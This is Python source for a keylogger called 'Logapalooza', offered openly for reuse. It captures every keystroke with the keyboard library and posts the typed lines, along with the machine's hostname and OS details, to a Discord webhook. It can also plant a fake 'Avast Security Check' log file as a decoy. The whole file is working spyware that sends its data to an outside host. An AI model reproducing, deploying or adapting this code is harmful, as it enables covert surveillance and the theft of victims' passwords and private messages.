#Coded by 0xM, use/change/modify as you wish.
#Github: https://github.com/0xMenTa


import keyboard
import os
import uuid
import datetime
import random
from discordwebhook import Discord
import platform

#Init variables
discord = Discord(url=[WEBHOOK URL])
result = ""
my_system = platform.uname()
first_msg = "🪬 Welcome and enjoy Logapalooza 🪬 :" + "\n 📄" + my_system.node + "\n 💻" + my_system.system + "\n 💿" + my_system.release + "\n 🛠️" + my_system.machine
discord.post(content=first_msg)

## Optionnal : create random repertories and legit logfile
def create_random_repertories():
    global filepath
    directory = str(uuid.uuid4())
    parent_dir = "PATH"
    filepath = parent_dir+directory
    os.mkdir(filepath)

def create_legit_logfile():
    global filename
    global filepath
    print(filepath)
    date = datetime.datetime.now()
    filerandom = str(random.randint(1,9999))
    filename= filepath+"/"+"Avast-SecurityCheck-"+date.strftime("%Y-%m-%d")+"-"+filerandom
    with open(filename, "a") as file:
            file.write("============================================================================================\n")
            file.write("  AVAST - SECURITY CHECK : Please do not turn off your computer during the security scan.\n")
            file.write("============================================================================================\n")

def on_key_press(event): #added a fonction -> writing in a txt file | the event variable is determined by the caps pressed on the keyboard
    global filename
    global result
    if event.name == "enter": #if the input is Enter we add \n to make a real ENTER input
        discord.post(content=result)
        result = ""
    else:
        if event.name == "space":
            result += " "
        else:
            result += event.name

# If you want to create dir + logfile
#create_random_repertories()
#create_legit_logfile()

keyboard.on_press(on_key_press) #If we press a key on keyboard, the fonction is played
keyboard.wait() #without this, the script is played just one time
